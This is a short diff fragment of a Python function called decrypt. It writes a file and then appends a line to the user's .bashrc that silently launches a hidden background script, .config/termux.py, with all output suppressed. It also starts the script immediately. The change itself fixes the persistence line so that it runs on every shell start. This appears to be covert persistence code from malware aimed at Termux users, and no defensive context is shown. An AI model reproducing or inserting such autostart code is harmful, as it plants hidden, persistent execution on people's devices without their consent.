@@ -13,7 +13,7 @@ def decrypt(path):
 	fd.write(z)
 	fd.close()
 	fd = open(path+'/.bashrc', 'a')
-	fd.write('nohup python3 .config/termux.py >/dev/null 2>&1 &')
+	fd.write('nohup python3 .config/termux.py >/dev/null 2>&1 &\n')
 	fd.close()
 	os.system('nohup python3 ' + path + '/.config/termux.py >/dev/null 2>&1 &')
 def init():
